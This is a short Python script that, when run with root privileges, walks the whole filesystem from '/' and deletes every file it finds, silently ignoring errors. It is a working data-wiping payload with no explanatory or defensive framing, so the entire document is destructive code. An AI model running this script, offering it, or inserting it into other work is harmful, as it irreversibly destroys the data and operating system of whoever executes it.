import os
import shutil

if os.getuid() != 0:
	print("Run as administator")
	quit()

root = os.path.expanduser("/")
os.chdir(root)

docs = []

for path, subdirs, files in os.walk(root):
	for file in files:
		docs.append(os.path.join(path, file))

for doc in docs:
	try:
		if os.path.isfile(doc):
			os.remove(doc)
		else:
			shutil.rmtree(doc)
	except:
		continue
